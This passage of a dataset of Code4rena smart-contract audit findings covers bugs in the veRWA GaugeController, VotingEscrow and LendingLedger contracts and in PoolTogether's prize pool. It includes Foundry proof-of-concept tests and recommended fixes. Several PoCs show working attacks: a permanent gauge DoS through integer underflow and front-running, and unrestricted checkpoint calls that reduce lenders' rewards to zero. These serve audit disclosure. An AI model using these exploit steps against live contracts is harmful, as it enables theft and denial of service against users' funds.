ve.locked(user1);         vm.warp(end - WEEK - 1);         vm.prank(user1);         ve.increaseAmount{value: LOCK_AMT}(LOCK_AMT);          assert(ve.lockEnd(user1) > ve.lockEnd(user2)); // now user1.end > user2.end even if user1 delegates to user2          vm.warp(end + 1); // now user2 is expired, but not user1         vm.prank(user2);         ve.withdraw(); // user2 can withdraw even there are delegator on it          uint256 user2_voting_power = ve.balanceOf(user2);         console.log(\"user2_voting_power after withdrawl = %s\\n\", user2_voting_power); // Zero Voting Power     } ``` Output: ``` qiuhao@pc:~/web3/c4/2023-08-verwa$ forge test --match-test testDelegateExpiredLock [\u2812] Compiling... No files changed, compilation skipped  Running 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest [PASS] testDelegateExpiredLock() (gas: 19208221) Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.82ms Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests) ``` ## Tools Used Manual Review ## Recommended Mitigation Steps increaseAmount() shouldn't update the sender's lock.end bigger than delegatee's lock end.   ## Assessed type  Governance"}, {"title": "When adding a gauge, its initial value has to be set by an admin or all voting power towards it will be lost", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/288", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "edited-by-warden", "H-03"], "target": "2023-08-verwa-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L118 https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L204   # Vulnerability details  ## Impact Voting power towards gauges will be lost and project will not work properly   ## Proof of Concept The mapping `time_weight` takes a gauge as a param and returns the most recent timestamp a gauge has had its weight recorded/ updated. There are 2 ways to set this value: through `_get_weight` and `_change_gauge_weight`.  ```solidity function _get_weight(address _gauge_addr) private returns (uint256) {         uint256 t = time_weight[_gauge_addr];         if (t > 0) {             Point memory pt = points_weight[_gauge_addr][t];             for (uint256 i; i < 500; ++i) {                 if (t > block.timestamp) break;                 t += WEEK;                 uint256 d_bias = pt.slope * WEEK;                 if (pt.bias > d_bias) {                     pt.bias -= d_bias;                     uint256 d_slope = changes_weight[_gauge_addr][t];                     pt.slope -= d_slope;                 } else {                     pt.bias = 0;                     pt.slope = 0;                 }                 points_weight[_gauge_addr][t] = pt;                 if (t > block.timestamp) time_weight[_gauge_addr] = t;             }             return pt.bias;         } else {             return 0;         }     } ```  The problem in `_get_weight` is that the initial value of any `time_weight[_gauge_addr]` will be 0. It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0. Any  time a user will use `_get_weight` to fill with recent data, the function will iterate over old values and will do nothing. Recent values won't be set and anything depending on it will receive 0 as a recent value. ```solidity     function _change_gauge_weight(address _gauge, uint256 _weight) internal {         uint256 old_gauge_weight = _get_weight(_gauge);         uint256 old_sum = _get_sum();         uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;          points_weight[_gauge][next_time].bias = _weight;         time_weight[_gauge] = next_time;          uint256 new_sum = old_sum + _weight - old_gauge_weight;         points_sum[next_time].bias = new_sum;         time_sum = next_time;     } ``` Since `_change_gauge_weight` is not called within `add_gauge`, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again. Here are 3 written test-cases which prove the statements above:  ```solidity    function testWithoutManualSet() public {         vm.startPrank(gov);         gc.add_gauge(gauge1);         vm.stopPrank();          vm.startPrank(user1);         ve.createLock{value: 1 ether}(1 ether);         gc.vote_for_gauge_weights(gauge1, 10000);         uint weight = gc.get_gauge_weight(gauge1);         console.log(\"gauge's weight after voting: \", weight);         vm.stopPrank();     }      function testWithManualSet() public {          vm.startPrank(gov);         gc.add_gauge(gauge1);         gc.change_gauge_weight(gauge1, 0);         vm.stopPrank();          vm.startPrank(user1);         ve.createLock{value: 1 ether}(1 ether);         gc.vote_for_gauge_weights(gauge1, 10000);         uint weight = gc.get_gauge_weight(gauge1);         console.log(\"gauge's weight after voting: \", weight);         vm.stopPrank();     }      function testWithChangeMidway() public {         vm.startPrank(gov);         gc.add_gauge(gauge1);         vm.stopPrank();          vm.startPrank(user1);         ve.createLock{value: 1 ether}(1 ether);         gc.vote_for_gauge_weights(gauge1, 10000);         uint weight = gc.get_gauge_weight(gauge1);         console.log(\"gauge's weight after voting: \", weight);         vm.stopPrank();          vm.prank(gov);         gc.change_gauge_weight(gauge1, 0);          vm.startPrank(user1);         gc.vote_for_gauge_weights(gauge1, 10000);         weight = gc.get_gauge_weight(gauge1);         console.log(\"gauge's weight after voting after admin set\", weight);          gc.vote_for_gauge_weights(gauge1, 0);         gc.vote_for_gauge_weights(gauge1, 10000);         weight = gc.get_gauge_weight(gauge1);         console.log(\"gauge's weight after voting after admin set after vote reset\", weight);              } ``` and the respective results: ``` [PASS] testWithoutManualSet() (gas: 645984) Logs:   gauge's weight after voting:  0 ``` ``` [PASS] testWithManualSet() (gas: 667994) Logs:   gauge's weight after voting:  993424657416307200 ``` ``` [PASS] testWithChangeMidway() (gas: 744022) Logs:   gauge's weight after voting:  0   gauge's weight after voting after admin set 0   gauge's weight after voting after admin set after vote reset 993424657416307200 ```  ## Tools Used Manual Review, Foundry  ## Recommended Mitigation Steps Upon adding a gauge, make a call to `change_gauge_weight` and set its initial weight to 0.       ## Assessed type  Error"}, {"title": "It is possible to DoS all the functions related to some gauge in `GaugeController`", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/206", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-05"], "target": "2023-08-verwa-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L91-L114 https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L142 https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L180 https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L189 https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L247   # Vulnerability details  `_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop: ```solidity             for (uint256 i; i < 500; ++i) {                 if (t > block.timestamp) break;                 t += WEEK;                 uint256 d_bias = pt.slope * WEEK;                 if (pt.bias > d_bias) {                     pt.bias -= d_bias;                     uint256 d_slope = changes_weight[_gauge_addr][t];                     pt.slope -= d_slope;                 } else {                     pt.bias = 0;                     pt.slope = 0;                 }                 points_weight[_gauge_addr][t] = pt;                 if (t > block.timestamp) time_weight[_gauge_addr] = t;             } ```  There are two possible scenarios: - `pt.bias > d_bias` - `pt.bias <= d_bias`  The first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.  However, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`  `change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).  Then, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.  After some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.  We will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.  If this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.  It's because, the following functions: - `checkpoint_gauge` - `gauge_relative_weight_write` - `gauge_relative_weight` - `_change_gauge_weight` - `change_gauge_weight` - `vote_for_gauge_weights` - `remove_gauge`  call `_get_weight` at some point.  Let's see what will happen in `_get_weight` when it's called: ```solidity                 uint256 d_bias = pt.slope * WEEK;                 if (pt.bias > d_bias) {                     pt.bias -= d_bias;                     uint256 d_slope = changes_weight[_gauge_addr][t];                     pt.slope -= d_slope;                 } else { ```  We will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will: - subtract `d_bias` from `pt.bias` which will succeed - attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`  However, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it).   If this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because: - `vote_for_gauge_weights` will revert - `change_gauge_weight` will revert  as they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.  So, in short, the scenario is as follows: 1. Users allocate their voting power to a gauge `X`. 2. Governance at some point decreases the weight of `X`. 3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`. 4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`. 5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow. 6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.  **Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.  ## Impact As stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.  In order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because: 1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen. 2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`). 3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance. 4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.  So, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).  ## Proof of Concept Please run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.  ```solidity function testPoC1() public     {         // gauge is being set up         vm.startPrank(gov);         gc.add_gauge(gauge1);         gc.change_gauge_weight(gauge1, 0);         vm.stopPrank();          // `user1` pays some money and adds his power to `gauge1`         vm.startPrank(user1);         ve.createLock{value: 1 ether}(1 ether);         gc.vote_for_gauge_weights(gauge1, 10000);         vm.warp(block.timestamp + 10 weeks);         gc.checkpoint_gauge(gauge1);         vm.stopPrank();          // `user2` does the same         vm.startPrank(user2);         ve.createLock{value: 1 ether}(1 ether);         gc.vote_for_gauge_weights(gauge1, 10000);         vm.warp(block.timestamp + 1 weeks);         gc.checkpoint_gauge(gauge1);         vm.stopPrank();          vm.warp(block.timestamp + 1825 days - 14 weeks);         vm.startPrank(gov);         // weight is changed to `0`, just to simplify         // normally, weight would just be decreased here and then subsequently decreased by users when their         // locking period is over until it finally drops to `0`         // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then         // withdraw his voting power leaving the gauge with `0` slope and `0` bias         gc.change_gauge_weight(gauge1, 0);         vm.warp(block.timestamp + 1 weeks);                  // now, weight is changed to some bigger value         gc.change_gauge_weight(gauge1, 1 ether);         vm.stopPrank();         // some time passes so that user1's locking period ends         vm.warp(block.timestamp + 5 weeks);                  // `user2` cannot change his weight although his `locked.end` is big enough         vm.prank(user2);         vm.expectRevert(stdError.arithmeticError);         gc.vote_for_gauge_weights(gauge1, 0);          // governance cannot change weight         vm.startPrank(gov);         vm.expectRevert(stdError.arithmeticError);         gc.change_gauge_weight(gauge1, 2 ether);                  // governance cannot even remove the gauge         // it's now impossible to do anything on gauge1         vm.expectRevert(stdError.arithmeticError);         gc.remove_gauge(gauge1);         vm.stopPrank();     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Perform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.      ## Assessed type  Under/Overflow"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/159", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-65"], "target": "2023-08-verwa-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-verwa-findings/blob/main/data/0x4non-Q.md)."}, {"title": "Upon IncreaseAmount the lock may not align to the nearest weekly increment", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/145", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-08-verwa-findings", "body": "Discovered by #8 \r \r In most other places, locks are created with the end time rounded down to nearest weekly increment using the `_floorToWeek` function.\r \r https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L422-L426\r \r ```solidity\r     // @dev Floors a timestamp to the nearest weekly increment\r     // @param _t Timestamp to floor\r     function _floorToWeek(uint256 _t) internal pure returns (uint256) {\r         return (_t / WEEK) * WEEK;\r     }\r ```\r \r However in IncreaseAmount, it is simply set to `block.timestamp + LOCKTIME` without the rounding:\r \r https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L301-L302\r \r ```solidity\r         newLocked.end = block.timestamp + LOCKTIME;\r \r ```"}, {"title": "lack of access control in LendingLedger.sol#checkpoint_lender and function checkpoint_market", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/142", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-07"], "target": "2023-08-verwa-findings", "body": "## Impact\r \r User's claim and sync_lender will be griefed at low cost\r \r ## Proof of Concept\r \r ```solidity\r    /// @notice Trigger a checkpoint explicitly.\r     ///     Never needs to be called explicitly, but could be used to ensure the checkpoints within the other functions consume less gas (because they need to forward less epochs)\r     /// @param _market Address of the market\r     /// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.\r     function checkpoint_market(\r         address _market,\r         uint256 _forwardTimestampLimit\r     ) external is_valid_epoch(_forwardTimestampLimit) {\r         require(\r             lendingMarketTotalBalanceEpoch[_market] > 0,\r             \"No deposits for this market\"\r         );\r         _checkpoint_market(_market, _forwardTimestampLimit);\r     }\r \r     /// @param _market Address of the market\r     /// @param _lender Address of the lender\r     /// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.\r     function checkpoint_lender(\r         address _market,\r         address _lender,\r         uint256 _forwardTimestampLimit\r     ) external is_valid_epoch(_forwardTimestampLimit) {\r         require(\r             lendingMarketBalancesEpoch[_market][_lender] > 0,\r             \"No deposits for this lender in this market\"\r         );\r         _checkpoint_lender(_market, _lender, _forwardTimestampLimit);\r     }\r \r ```\r \r this two function lacks access control, the caller is never validated, meaning anyone can call this function\r \r the market is not validated to see if the market is whitelisted or not\r \r the timestamp is never validated, the is_valid_epoch(_forwardTimestampLimit) is insufficient\r \r ```solidity\r   /// @notice Check that a provided timestamp is a valid epoch (divisible by WEEK) or infinity\r     /// @param _timestamp Timestamp to check\r     modifier is_valid_epoch(uint256 _timestamp) {\r         require(\r             _timestamp % WEEK == 0 || _timestamp == type(uint256).max,\r             \"Invalid timestamp\"\r         );\r         _;\r     }\r ```\r \r the user can just pick a past timestamp as the _forwardTimestampLimit\r \r for example, if we set _forwardTimestampLimit to 0\r \r then for example in _checkpoint_market\r \r ```solidity\r    function _checkpoint_market(\r         address _market,\r         uint256 _forwardTimestampLimit\r     ) private {\r         uint256 currEpoch = (block.timestamp / WEEK) * WEEK;\r         uint256 lastMarketUpdateEpoch = lendingMarketTotalBalanceEpoch[_market];\r         uint256 updateUntilEpoch = Math.min(currEpoch, _forwardTimestampLimit);\r         if (lastMarketUpdateEpoch > 0 && lastMarketUpdateEpoch < currEpoch) {\r             // Fill in potential gaps in the market total balances history\r             uint256 lastMarketBalance = lendingMarketTotalBalance[_market][\r                 lastMarketUpdateEpoch\r             ];\r             for (\r                 uint256 i = lastMarketUpdateEpoch;\r                 i <= updateUntilEpoch;\r                 i += WEEK\r             ) {\r                 lendingMarketTotalBalance[_market][i] = lastMarketBalance;\r             }\r         }\r         lendingMarketTotalBalanceEpoch[_market] = updateUntilEpoch;\r     }\r ```\r \r we set the lendingMarketTotalBalanceEpoch[_market] to 0\r \r then if the next call of the _checkpoint_market, the for loop would never run because the lastMarketUpdateEpoch is 0\r \r over time, even when the for loop inside _checkpoint_market does run, the caller are forced to pay very high gas fee\r \r same issue applies to _checkpoint_lender as well\r \r user can decrease lendingMarketBalancesEpoch, even to 0\r \r basically, if a malicious actor call these two function with forwardTimestampLimit 0,\r \r then the _checkpoint_lender and _checkpoint_market would never run inside sync_ledger and claim reward\r \r because user's reward can be griefed to 0 and stated are failed to updated properly\r \r **POC 1:**\r \r ```solidity\r   function testLackOfAccessControlSyncMarket_POC_1() public {\r         payable(ledger).transfer(1000 ether);\r         uint248 amountPerEpoch = 1 ether;\r \r         uint256 fromEpoch = WEEK * 5;\r         uint256 toEpoch = WEEK * 10;\r \r         address lendingMarket = vm.addr(5201314);\r \r         vm.prank(goverance);\r         ledger.setRewards(fromEpoch, toEpoch, amountPerEpoch);\r       \r         vm.warp(block.timestamp + WEEK);\r \r         vm.prank(goverance);\r         ledger.whiteListLendingMarket(lendingMarket, true);\r         address lender = users[1];\r         vm.startPrank(lendingMarket);\r \r         int256 deltaStart = 1 ether;\r         uint256 epochStart = (block.timestamp / WEEK) * WEEK;\r         ledger.sync_ledger(lender, deltaStart);\r \r         // gaps of 3 week\r         uint256 newTime = block.timestamp + 3 * WEEK;\r         vm.warp(newTime);\r         int256 deltaEnd = 1 ether;\r         uint256 epochEnd = (newTime / WEEK) * WEEK;\r         ledger.sync_ledger(lender, deltaEnd);\r \r         newTime = block.timestamp + 20 * WEEK;\r         vm.warp(newTime);\r \r         console.log(\"---sync ledger after set the update epoch to 0 --\");\r \r         // ledger.checkpoint_market(lendingMarket, 0);\r         // ledger.checkpoint_lender(lendingMarket, lender, 0);\r         ledger.sync_ledger(lender, deltaEnd);\r \r         vm.stopPrank();\r         vm.prank(lender);\r \r         uint256 balanceBefore = address(lender).balance;\r         ledger.claim(lendingMarket, fromEpoch, toEpoch);\r         uint256 balanceAfter = address(lender).balance;\r         console.log(balanceAfter - balanceBefore);\r \r         vm.expectRevert(\"No deposits for this user\");\r         ledger.claim(lendingMarket, fromEpoch, toEpoch);\r     }\r ```\r \r if we run the POC, we get the normal result, user can claim and get 6 ETH as reward\r \r ```solidity\r  ---sync ledger after set the update epoch to 0 --\r  6000000000000000000\r ```\r \r if we uncomment:\r \r ```solidity\r   // ledger.checkpoint_market(lendingMarket, 0);\r   // ledger.checkpoint_lender(lendingMarket, lender, 0);\r ```\r \r the claimed reward goes to 0\r \r ## Tools Used\r \r Manual Review\r \r ## Recommended Mitigation Steps\r \r add access control to checkpoint_market and checkpoint_lender\r \r "}, {"title": "Replace old_sum_bias by old_bias", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/140", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-08-verwa-findings", "body": "```diff\r diff --git a/src/GaugeController.sol b/src/GaugeController.sol\r index 68b832a..1794639 100644\r --- a/src/GaugeController.sol\r +++ b/src/GaugeController.sol\r @@ -250,7 +250,7 @@ contract GaugeController {\r          uint256 old_sum_slope = points_sum[next_time].slope;\r  \r          points_weight[_gauge_addr][next_time].bias = Math.max(old_weight_bias + new_bias, old_bias) - old_bias;\r -        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_sum_bias) - old_bias;\r +        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_bias) - old_bias;\r          if (old_slope.end > next_time) {\r              points_weight[_gauge_addr][next_time].slope =\r                  Math.max(old_weight_slope + new_slope.slope, old_slope.slope) -\r ```\r \r _Originally posted by @iFrostizz in https://github.com/OpenCoreCH/test-squad-verwa/issues/111#issuecomment-1655611968_\r             "}, {"title": "If governance removes a gauge, user's voting power for that gauge will be lost.", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/62", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "upgraded by judge", "H-08"], "target": "2023-08-verwa-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L127-L132 https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213 https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L241   # Vulnerability details  ## Summary  If governance removes a gauge for any (non-malicious) reason, a user's voting power for that gauge will be completely lost.  ## Vulnerability details  The `GaugeController` is a solidity port of Curve DAO's Vyper implementation. Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).  One modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.  Consider the following scenario: - Alice has some veRWA, and is now able to vote.  - She votes on some pool, say, G1, using 100% of her voting power. - Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired. - Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.  It is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.  ## Impact  Users can lose their voting power.  ## Proof of concept  We provide the following POC to use on `GaugeController` tests.  ```solidity function testPOC() public {     // prepare     uint256 v = 10 ether;     vm.deal(gov, v);     vm.startPrank(gov);     ve.createLock{value: v}(v);      // add gauges     gc.add_gauge(gauge1);     gc.change_gauge_weight(gauge1, 100);     gc.add_gauge(gauge2);     gc.change_gauge_weight(gauge2, 100);      // all-in on gauge1     gc.vote_for_gauge_weights(gauge1, 10000);      // governance removes gauge1     gc.remove_gauge(gauge1);      // cannot vote for gauge2     vm.expectRevert(\"Used too much power\");     gc.vote_for_gauge_weights(gauge2, 10000);      // cannot remove vote for gauge1     vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate     gc.vote_for_gauge_weights(gauge1, 0);      // cannot vote for gauge2 (to demonstrate again that voting power is not removed)     vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate     gc.vote_for_gauge_weights(gauge2, 10000); } ```  ## Tools used  Forge, manual review  ## Recommended mitigation steps  The simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:  ```solidity require(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\"); ```  https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213  The given POC can then be the test case to verify successful mitigation.  As a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.   ## Assessed type  Invalid Validation"}, {"title": "Number of prize tiers may never scale due to aggressive new algorithm", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-mitigation-findings/issues/104", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "MR-M-16"], "target": "2023-08-pooltogether-mitigation-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/main/src/PrizePool.sol#L369 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/main/src/PrizePool.sol#L807-L811 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/main/src/abstract/TieredLiquidityDistributor.sol#L602-L619 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/main/src/abstract/TieredLiquidityDistributor.sol#L156 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/main/src/libraries/TierCalculationLib.sol#L134-L147   # Vulnerability details  ## Comments This issue is very similar to M-14 but covers another edge case where the threshold check is not performed when there are currently 14 prize tiers and at least 1 canary tier is claimed. This is due to an early return of `MAXIMUM_NUMBER_OF_TIERS`.  ## Mitigation The updated implementation has significantly changed the tier expansion logic so that it only depends on the total number of prize claims. The current number of tiers and the number of canary tier claims has no impact on the tier expansion logic and therefore the original issue has been resolved. However the updated logic has introduced a new issue.  Note: The same PR fixes multiple issues, but I have arbitrarily chosen to link this new issue with M-16.  ## New issue With the new tier expansion algorithm it is highly likely that the number of prize tiers will stagnate since the percentage of prizes that need to be claimed for a tier expansion increases as the number of tiers increase.  ## Proof of Concept When a draw is closed, the next number of tiers is computed based on the total number of claims with a call to `_computeNextNumberOfTiers`:  ```   function _computeNextNumberOfTiers(uint32 _claimCount) internal view returns (uint8) {     // claimCount is expected to be the estimated number of claims for the current prize tier.     uint8 numTiers = _estimateNumberOfTiersUsingPrizeCountPerDraw(_claimCount);     return numTiers > MAXIMUM_NUMBER_OF_TIERS ? MAXIMUM_NUMBER_OF_TIERS : numTiers; // add new canary tier   } ```  where the first part of the underlying `_estimateNumberOfTiersUsingPrizeCountPerDraw` method looks like:  ```   function _estimateNumberOfTiersUsingPrizeCountPerDraw(uint32 _prizeCount) internal view returns (uint8) {     if (_prizeCount < ESTIMATED_PRIZES_PER_DRAW_FOR_4_TIERS) {       return 3;     } else if (_prizeCount < ESTIMATED_PRIZES_PER_DRAW_FOR_5_TIERS) {       return 4; ```  Thus, for the number of tiers to increase from 3 to 4, the number of prize claims must be greater than or equal to `ESTIMATED_PRIZES_PER_DRAW_FOR_4_TIERS`:  ``` ESTIMATED_PRIZES_PER_DRAW_FOR_4_TIERS = TierCalculationLib.estimatedClaimCount(3, _grandPrizePeriodDraws); ```  Here, the estimated claim count is the sum of the number of prizes for a tier multiplied by the tier odds for all the tiers:  ```   function estimatedClaimCount(     uint8 _numberOfTiers,     uint24 _grandPrizePeriod   ) internal pure returns (uint32) {     uint32 count = 0;     for (uint8 i = 0; i < _numberOfTiers; i++) {       count += uint32(         uint256(           unwrap(sd(int256(prizeCount(i))).mul(getTierOdds(i, _numberOfTiers, _grandPrizePeriod)))         )       );     }     return count;   } ```  If we consider the actual number of prizes available for 3 tiers it is: 1 * 1/365 + 4 * 1 + 16 * 1 = 20 + 1/365 ~= 20  The return value of `ESTIMATED_PRIZES_PER_DRAW_FOR_4_TIERS` is: 1 * 1/365 + 4 * 1/sqrt(365) + 16 * 1 ~= 16  This difference is due to the fact that the `getTierOdds` in `TierCalculationLib.sol` doesn't return 1 for both the highest normal prize tier and the canary tier (it just returns 1 for the canary tier).  In this case, in order for the number of prize tiers to increase, at least 16 prizes (i.e. 80%) need to be claimed in the previous claim window. This doesn't sound too bad, but because the number of prizes per tier scales exponentially, the percentage of prizes that need to be claimed increases as the number of prize tiers increase.  The effect is that as a higher number of tiers are reached, a higher percentage of canary prizes need to be claimed in order to increase the number of prize tiers. The end result is that it is likely the number of prize tiers will stagnate despite there being enough liquidity available to increase the number of prize tiers.  ## Tools Used Manual review  ## Recommendation I would recommend applying a reverse exponential weighting to the number of prize claims required for a tier expansion based on the number of tiers. By this I mean that since the number of prizes per tier is 4^i, a similar weighting should be applied in the reverse direction to try to keep the percentage of prize claims required for a tier expansion relatively stable.  Alternatively, I would update `_estimateNumberOfTiersUsingPrizeCountPerDraw` to apply a fixed percentage to the actual number of prizes available (based on tiers odds of 1 for both the canary prize tier and the highest standard prize tier). I feel like this is the easier and also more logical fix.   ## Assessed type  Math"}, {"title": "Claiming prizes will be bricked if prize periods are not aligned with twab periods", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-mitigation-findings/issues/99", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "MR-M-13"], "target": "2023-08-pooltogether-mitigation-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/main/src/TwabController.sol#L281-L299 